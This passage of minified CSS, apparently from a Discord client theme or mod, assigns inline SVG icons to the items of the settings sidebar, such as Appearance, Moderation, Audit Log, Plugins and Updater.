5H6v-2h8v2zm4-6H6V6h12v2z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Appearance]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23fff' width='18' height='18'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M14 6l-3.75 5 2.85 3.8-1.6 1.2C9.81 13.75 7 10 7 10l-6 8h22L14 6z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=StreamerMode]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Language]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95c-.32-1.25-.78-2.45-1.38-3.56 1.84.63 3.37 1.91 4.33 3.56zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2 0 .68.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56-1.84-.63-3.37-1.9-4.33-3.56zm2.95-8H5.08c.96-1.66 2.49-2.93 4.33-3.56C8.81 5.55 8.35 6.75 8.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2 0-.68.07-1.35.16-2h4.68c.09.65.16 1.32.16 2 0 .68-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95c-.96 1.65-2.49 2.93-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2 0-.68-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Linux]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23fff' width='18' height='18'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M21 2H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h7v2H8v2h8v-2h-2v-2h7c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H3V4h18v12z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Windows]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23fff' width='18' height='18'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M21 2H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h7v2H8v2h8v-2h-2v-2h7c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H3V4h18v12z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=changelog]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' fill='white' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=logout]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M10.09 15.59L11.5 17l5-5-5-5-1.41 1.41L12.67 11H3v2h9.67l-2.58 2.59zM19 3H5c-1.11 0-2 .9-2 2v4h2V5h14v14H5v-4H3v4c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z'/%3E%3C/svg%3E");--settings-icon-color: var(--settings-logout)}.side-8zPYf6>.item-PXvHYJ[data-item-id=OVERVIEW]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none' /%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=ROLES]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none' /%3E%3Cpath d='M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=EMOJI]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none'%3E%3Cpath d='M12 2C6.477 2 2 6.477 2 12c0 5.522 4.477 10 10 10s10-4.478 10-10c0-5.523-4.477-10-10-10zM8 6a2 2 0 11-.001 4.001A2 2 0 018 6zm10 8c0 2.617-2.86 5-6 5s-6-2.383-6-5v-1h12v1zm-2-4a2 2 0 110-4 2 2 0 010 4z' fill='currentColor'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=MODERATION]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none' /%3E%3Cpath d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=AUDIT_LOG]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' enable-background='new 0 0 24 24' height='24' viewBox='0 0 24 24' width='24'%3E%3Crect fill='none' height='24' width='24' /%3E%3Cpath d='M19,3H4.99C3.89,3,3,3.9,3,5l0.01,14c0,1.1,0.89,2,1.99,2h10l6-6V5C21,3.9,20.1,3,19,3z M7,8h10v2H7V8z M12,14H7v-2h5V14z M14,19.5V14h5.5L14,19.5z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=INTEGRATIONS]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' enable-background='new 0 0 24 24' height='24' viewBox='0 0 24 24' width='24'%3E%3Cg%3E%3Crect fill='none' height='24' width='24' /%3E%3Ccircle cx='12' cy='3.5' fill='none' r='.75' /%3E%3Ccircle cx='12' cy='3.5' fill='none' r='.75' /%3E%3Ccircle cx='12' cy='3.5' fill='none' r='.75' /%3E%3Cpath d='M19,3h-4.18C14.4,1.84,13.3,1,12,1S9.6,1.84,9.18,3H5C4.86,3,4.73,3.01,4.6,3.04C4.21,3.12,3.86,3.32,3.59,3.59 c-0.18,0.18-0.33,0.4-0.43,0.64C3.06,4.46,3,4.72,3,5v14c0,0.27,0.06,0.54,0.16,0.78c0.1,0.24,0.25,0.45,0.43,0.64 c0.27,0.27,0.62,0.47,1.01,0.55C4.73,20.99,4.86,21,5,21h14c1.1,0,2-0.9,2-2V5C21,3.9,20.1,3,19,3z M11,14.17l-1.41,1.42L6,12 l3.59-3.59L11,9.83L8.83,12L11,14.17z M12,4.25c-0.41,0-0.75-0.34-0.75-0.75S11.59,2.75,12,2.75s0.75,0.34,0.75,0.75 S12.41,4.25,12,4.25z M14.41,15.59L13,14.17L15.17,12L13,9.83l1.41-1.42L18,12L14.41,15.59z' /%3E%3C/g%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=WIDGET]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M13 13v8h8v-8h-8zM3 21h8v-8H3v8zM3 3v8h8V3H3zm13.66-1.31L11 7.34 16.66 13l5.66-5.66-5.66-5.65z'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=GUILD_TEMPLATES]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath clip-rule='evenodd' d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=COMMUNITY]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none' /%3E%3Cpath d='M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=ANALYTICS]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' enable-background='new 0 0 24 24' height='24' viewBox='0 0 24 24' width='24'%3E%3Cg%3E%3Crect fill='none' height='24' width='24' /%3E%3C/g%3E%3Cg%3E%3Cg%3E%3Cpath d='M21,8c-1.45,0-2.26,1.44-1.93,2.51l-3.55,3.56c-0.3-0.09-0.74-0.09-1.04,0l-2.55-2.55C12.27,10.45,11.46,9,10,9 c-1.45,0-2.27,1.44-1.93,2.52l-4.56,4.55C2.44,15.74,1,16.55,1,18c0,1.1,0.9,2,2,2c1.45,0,2.26-1.44,1.93-2.51l4.55-4.56 c0.3,0.09,0.74,0.09,1.04,0l2.55,2.55C12.73,16.55,13.54,18,15,18c1.45,0,2.27-1.44,1.93-2.52l3.56-3.55 C21.56,12.26,23,11.45,23,10C23,8.9,22.1,8,21,8z' /%3E%3Cpolygon points='15,9 15.94,6.93 18,6 15.94,5.07 15,3 14.08,5.07 12,6 14.08,6.93' /%3E%3Cpolygon points='3.5,11 4,9 6,8.5 4,8 3.5,6 3,8 1,8.5 3,9' /%3E%3C/g%3E%3C/g%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=PARTNER]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32' fill='none'%3E%3Cpath d='M23.6632 11.1399L19.5797 13.7436C18.9964 14.0329 18.7047 14.0329 18.1213 13.7436C17.8296 13.4543 17.2463 13.165 16.9546 12.8757C15.7879 12.5864 14.9129 12.8757 14.0378 13.4543L12.5794 14.3222L5.2875 19.2404C3.53744 20.1083 1.49569 19.819 0.620658 18.0831C-0.546053 16.6366 0.0373027 14.6115 1.49569 13.4543L10.246 7.66824C12.5794 6.22172 15.4962 5.64312 18.1213 6.22172C20.4547 6.80033 22.2048 7.95754 23.6632 9.69336C24.2466 10.272 23.9549 10.8506 23.6632 11.1399Z' fill='currentColor'/%3E%3Cpath d='M32 16.2181C32 17.3684 31.4176 18.5188 30.5439 19.094L21.5164 24.8457C19.7691 25.996 18.0218 26.5712 15.9833 26.5712C15.1097 26.5712 14.5273 26.5712 13.6536 26.2836C11.324 25.7085 9.57668 24.5581 8.12062 22.8326C7.82941 22.2574 8.12062 21.6822 8.41184 21.3947L12.4888 18.8064C12.78 18.5188 13.3624 18.5188 13.6536 18.8064C14.2361 19.094 14.8185 19.3816 15.1097 19.6691C16.2746 19.6691 17.1482 19.6691 18.0218 19.094L20.0603 17.9436L25.8845 13.9174L26.7582 13.3422C28.2142 12.4795 30.5439 12.7671 31.4176 14.205C32 15.0678 32 15.6429 32 16.2181Z' fill='currentColor'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=DISCOVERY]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none' /%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=COMMUNITY_WELCOME]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0V0z' fill='none' /%3E%3Cpath d='M21 3H3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h18c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 16.02H3V4.98h18v14.04zM10 12H8l4-4 4 4h-2v4h-4v-4z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=GUILD_PREMIUM]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 8 12' fill='none'%3E%3Cpath d='M4 0L0 4V8L4 12L8 8V4L4 0ZM7 7.59L4 10.59L1 7.59V4.41L4 1.41L7 4.41V7.59Z' fill='currentColor' /%3E%3Cpath d='M2 4.83V7.17L4 9.17L6 7.17V4.83L4 2.83L2 4.83Z' fill='currentColor' /%3E%3C/svg%3E%0A");--settings-icon-color: var(--settings-guild-premium)}.side-8zPYf6>.item-PXvHYJ[data-item-id=GUILD_PREMIUM][style*="color: rgb(255, 255, 255)"]::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 8 12' fill='none'%3E%3Cpath d='M4 0L0 4V8L4 12L8 8V4L4 0ZM7 7.59L4 10.59L1 7.59V4.41L4 1.41L7 4.41V7.59Z' fill='currentColor' /%3E%3Cpath d='M2 4.83V7.17L4 9.17L6 7.17V4.83L4 2.83L2 4.83Z' fill='currentColor' /%3E%3C/svg%3E%0A");--settings-icon-color: --settings-alt-focused}.side-8zPYf6>.item-PXvHYJ[data-item-id=MEMBERS]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none' /%3E%3Cpath d='M11.99 2c-5.52 0-10 4.48-10 10s4.48 10 10 10 10-4.48 10-10-4.48-10-10-10zm3.61 6.34c1.07 0 1.93.86 1.93 1.93 0 1.07-.86 1.93-1.93 1.93-1.07 0-1.93-.86-1.93-1.93-.01-1.07.86-1.93 1.93-1.93zm-6-1.58c1.3 0 2.36 1.06 2.36 2.36 0 1.3-1.06 2.36-2.36 2.36s-2.36-1.06-2.36-2.36c0-1.31 1.05-2.36 2.36-2.36zm0 9.13v3.75c-2.4-.75-4.3-2.6-5.14-4.96 1.05-1.12 3.67-1.69 5.14-1.69.53 0 1.2.08 1.9.22-1.64.87-1.9 2.02-1.9 2.68zM11.99 20c-.27 0-.53-.01-.79-.04v-4.07c0-1.42 2.94-2.13 4.4-2.13 1.07 0 2.92.39 3.84 1.15-1.17 2.97-4.06 5.09-7.45 5.09z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=INSTANT_INVITES]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none' /%3E%3Cpath d='M2.01 21L23 12 2.01 3 2 10l15 2-15 2z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=BANS]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24'%3E%3Cpath d='M2.3,20.28L11.9,10.68L10.5,9.26L9.78,9.97C9.39,10.36 8.76,10.36 8.37,9.97L7.66,9.26C7.27,8.87 7.27,8.24 7.66,7.85L13.32,2.19C13.71,1.8 14.34,1.8 14.73,2.19L15.44,2.9C15.83,3.29 15.83,3.92 15.44,4.31L14.73,5L16.15,6.43C16.54,6.04 17.17,6.04 17.56,6.43C17.95,6.82 17.95,7.46 17.56,7.85L18.97,9.26L19.68,8.55C20.07,8.16 20.71,8.16 21.1,8.55L21.8,9.26C22.19,9.65 22.19,10.29 21.8,10.68L16.15,16.33C15.76,16.72 15.12,16.72 14.73,16.33L14.03,15.63C13.63,15.24 13.63,14.6 14.03,14.21L14.73,13.5L13.32,12.09L3.71,21.7C3.32,22.09 2.69,22.09 2.3,21.7C1.91,21.31 1.91,20.67 2.3,20.28M20,19A2,2 0 0,1 22,21V22H12V21A2,2 0 0,1 14,19H20Z' /%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=DELETE]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg version='1.0' xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 24 24'%3E%3Cpath d='M9 3c0 .5-1.3 1-3 1-1.6 0-3 .4-3 1s3.7 1 9 1 9-.4 9-1-1.3-1-3-1c-1.6 0-3-.5-3-1 0-.6-1.3-1-3-1-1.6 0-3 .4-3 1zM5.2 13.7l.3 6.8h13l.3-6.8.3-6.7H4.9l.3 6.7zm5.8.3c0 1.6-.4 3-1 3-.5 0-1-1.4-1-3 0-1.7.5-3 1-3 .6 0 1 1.3 1 3zm4 0c0 1.6-.4 3-1 3-.5 0-1-1.4-1-3 0-1.7.5-3 1-3 .6 0 1 1.3 1 3z'/%3E%3C/svg%3E%0A");--settings-icon-color: var(--settings-guild-delete)}.side-8zPYf6>.item-PXvHYJ[data-item-id=DELETE][style*="color: rgb(255, 255, 255)"]::before{--icon: url("data:image/svg+xml,%3Csvg version='1.0' xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 24 24'%3E%3Cpath d='M9 3c0 .5-1.3 1-3 1-1.6 0-3 .4-3 1s3.7 1 9 1 9-.4 9-1-1.3-1-3-1c-1.6 0-3-.5-3-1 0-.6-1.3-1-3-1-1.6 0-3 .4-3 1zM5.2 13.7l.3 6.8h13l.3-6.8.3-6.7H4.9l.3 6.7zm5.8.3c0 1.6-.4 3-1 3-.5 0-1-1.4-1-3 0-1.7.5-3 1-3 .6 0 1 1.3 1 3zm4 0c0 1.6-.4 3-1 3-.5 0-1-1.4-1-3 0-1.7.5-3 1-3 .6 0 1 1.3 1 3z'/%3E%3C/svg%3E%0A");--settings-icon-color: --settings-alt-focused}.side-8zPYf6>.item-PXvHYJ[data-item-id=PERMISSIONS]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M13.2667 8.46667C15.3285 8.46667 17 6.7952 17 4.73333C17 2.67147 15.3285 1 13.2667 1H4.73333C2.67147 1 1 2.67147 1 4.73333C1 6.7952 2.67147 8.46667 4.73333 8.46667H13.2667ZM7.34612 7.4H13.2667C14.7394 7.4 15.9333 6.20609 15.9333 4.73333C15.9333 3.26057 14.7394 2.06667 13.2667 2.06667H7.34612C8.03762 2.74428 8.46667 3.6887 8.46667 4.73333C8.46667 5.77797 8.03762 6.72239 7.34612 7.4ZM2.06667 4.73333C2.06667 3.26057 3.26057 2.06667 4.73333 2.06667C6.20609 2.06667 7.4 3.26057 7.4 4.73333C7.4 6.20609 6.20609 7.4 4.73333 7.4C3.26057 7.4 2.06667 6.20609 2.06667 4.73333Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M4.73333 9.53333C2.67147 9.53333 1 11.2048 1 13.2667C1 15.3285 2.67147 17 4.73333 17H13.2667C15.3285 17 17 15.3285 17 13.2667C17 11.2048 15.3285 9.53333 13.2667 9.53333H4.73333ZM10.6539 10.6H4.73333C3.26057 10.6 2.06667 11.7939 2.06667 13.2667C2.06667 14.7394 3.26057 15.9333 4.73333 15.9333H10.6539C9.96238 15.2557 9.53333 14.3113 9.53333 13.2667C9.53333 12.222 9.96238 11.2776 10.6539 10.6ZM15.9333 13.2667C15.9333 14.7394 14.7394 15.9333 13.2667 15.9333C11.7939 15.9333 10.6 14.7394 10.6 13.2667C10.6 11.7939 11.7939 10.6 13.2667 10.6C14.7394 10.6 15.9333 11.7939 15.9333 13.2667Z' fill='white'/%3E%3Cpath d='M4.73333 15.9333C3.26057 15.9333 2.06667 14.7394 2.06667 13.2667C2.06667 11.7939 3.26057 10.6 4.73333 10.6H10.6539C9.96238 11.2776 9.53333 12.222 9.53333 13.2667C9.53333 14.3113 9.96238 15.2557 10.6539 15.9333H4.73333Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M13.2667 2.06667C14.7394 2.06667 15.9333 3.26057 15.9333 4.73333C15.9333 6.20609 14.7394 7.4 13.2667 7.4H7.34612C8.03762 6.72239 8.46667 5.77797 8.46667 4.73333C8.46667 3.6887 8.03762 2.74428 7.34612 2.06667H13.2667ZM4.73333 2.06667C3.26057 2.06667 2.06667 3.26057 2.06667 4.73333C2.06667 6.20609 3.26057 7.4 4.73333 7.4C6.20609 7.4 7.4 6.20609 7.4 4.73333C7.4 3.26057 6.20609 2.06667 4.73333 2.06667ZM15.9333 13.2667C15.9333 14.7394 14.7394 15.9333 13.2667 15.9333C11.7939 15.9333 10.6 14.7394 10.6 13.2667C10.6 11.7939 11.7939 10.6 13.2667 10.6C14.7394 10.6 15.9333 11.7939 15.9333 13.2667ZM13.2667 8.46667H4.73333C2.67147 8.46667 1 6.7952 1 4.73333C1 2.67147 2.67147 1 4.73333 1H13.2667C15.3285 1 17 2.67147 17 4.73333C17 6.7952 15.3285 8.46667 13.2667 8.46667ZM4.73333 9.53333H13.2667C15.3285 9.53333 17 11.2048 17 13.2667C17 15.3285 15.3285 17 13.2667 17H4.73333C2.67147 17 1 15.3285 1 13.2667C1 11.2048 2.67147 9.53333 4.73333 9.53333Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-general]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' enable-background='new 0 0 24 24' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cg%3E%3Cpath d='M0,0h24v24H0V0z' fill='none'/%3E%3Cpath d='M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.07-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.74,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.07,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.44-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.47-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z'/%3E%3C/g%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-moduleManager-plugins]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23fff' width='18' height='18'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5a2.5 2.5 0 00-5 0V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5a2.5 2.5 0 000-5z'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-moduleManager-themes]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' width='24' height='24'%3E%3Cpath fill='currentColor' d='M7 14c-1.66 0-3 1.34-3 3 0 1.31-1.16 2-2 2 .92 1.22 2.49 2 4 2 2.21 0 4-1.79 4-4 0-1.66-1.34-3-3-3zm13.71-9.37l-1.34-1.34c-.39-.39-1.02-.39-1.41 0L9 12.25 11.75 15l8.96-8.96c.39-.39.39-1.02 0-1.41z'%3E%3C/path%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-updater]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' enable-background='new 0 0 24 24' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cg%3E%3Crect fill='none' height='24' width='24' x='0'/%3E%3C/g%3E%3Cg%3E%3Cg%3E%3Cg%3E%3Cpath d='M21,10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-0.1c-2.73,2.71-2.73,7.08,0,9.79s7.15,2.71,9.88,0 C18.32,15.65,19,14.08,19,12.1h2c0,1.98-0.88,4.55-2.64,6.29c-3.51,3.48-9.21,3.48-12.72,0c-3.5-3.47-3.53-9.11-0.02-12.58 s9.14-3.47,12.65,0L21,3V10.12z M12.5,8v4.25l3.5,2.08l-0.72,1.21L11,13V8H12.5z'/%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-labs]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg fill='%23FFFFFF' width='24' height='24' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M6,22A3,3 0 0,1 3,19C3,18.4 3.18,17.84 3.5,17.37L9,7.81V6A1,1 0 0,1 